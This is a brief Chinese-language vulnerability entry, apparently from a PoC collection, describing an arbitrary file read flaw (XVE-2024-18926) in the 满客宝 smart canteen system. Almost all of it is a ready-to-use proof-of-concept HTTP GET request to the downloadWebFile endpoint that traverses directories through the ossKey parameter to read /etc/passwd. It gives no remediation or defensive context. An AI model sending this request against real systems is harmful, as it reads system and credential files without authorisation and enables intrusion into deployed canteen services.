# 满客宝智慧食堂系统downloadWebFile存在任意文件读取漏洞(XVE-2024-18926)



## poc

```java
GET /base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=a&ossKey=/../../../../../../../../../../../etc/passwd HTTP/1.1
Host：
```

